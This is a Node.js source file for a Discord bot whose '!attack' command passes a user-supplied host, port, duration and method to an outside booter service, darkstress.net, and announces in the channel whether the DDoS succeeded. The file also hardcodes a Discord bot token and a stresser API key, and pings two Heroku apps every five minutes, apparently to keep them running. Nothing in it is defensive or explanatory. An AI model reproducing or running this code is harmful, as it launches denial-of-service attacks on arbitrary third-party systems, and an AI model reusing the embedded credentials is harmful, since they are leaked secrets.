const express = require('express')
const app = express()

const requestIp = require('request-ip');

const axios = require('axios').default;

var http = require("http");

try{
  setInterval(function() {
    http.get("http://molarity.herokuapp.com/");
    http.get("http://gamesense-pub.herokuapp.com/");
}, 300000); // every 5 minutes (300000)
}catch(e){

}


const Discord = require("discord.js");
const client = new Discord.Client({
    intents:[
        Discord.Intents.FLAGS.GUILDS,
        Discord.Intents.FLAGS.GUILD_MESSAGES
    ]
});

client.on("ready", ()=>{
  console.log("DHIT")
})

function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

client.on('message',msg =>{
  if(msg.content.startsWith("!attack") ){
      const arr = msg.content.split(" ")
      console.log(arr)


    axios.get(`https://darkstress.net/api/execute?key=fd190cc7-ea09-4aaf-b840-cc44db545c4a&host=${arr[1]}&port=${arr[2]}&time=${arr[3]}&method=${arr[4]}&server=64076e8b-bf05-4cf3-95b8-8368b5d1479c`)
    .then(function (response) {
        // handle success
        console.log(response);
        if(response.data.error == false){
            msg.channel.send("DDOS COMPLETED SUCCESSFULLY.")
        }else if (response.data.error == true) {
            msg.channel.send(`DDOS FAILED: MSG = ${response.data.message} `)
        }
    })
    .catch(function (error) {
        // handle error
    
     
            msg.channel.send(`DDOS FAILED! MSG = ${error.response.data.message} `)
    

    })
    .then(function () {
        // always executed
    });

 
    
  }
})
// toke = OTcwNjM1NzQzNzI0NzI0Mjg0.G9o6zv.LoGCb5ALn9JKl797P-C74qZlo4mZk4Krccvahk
client.login("OTcwNjM1NzQzNzI0NzI0Mjg0.G9o6zv.LoGCb5ALn9JKl797P-C74qZlo4mZk4Krccvahk")
// dd

app.use(requestIp.mw())

// BOTS


app.get('/', (req, res) => {
  res.send('Hello World!')
})

// app.use("/api/logs",require("./routes/api/logs") )
// app.use("/api/discord-logs",require("./routes/api/logsa") )
// app.use("/api/molarity", require("./routes/api/molarity"))


const port = process.env.PORT || 5000;
app.listen(port, () => {
  console.log(`Example app listening on port}`)
})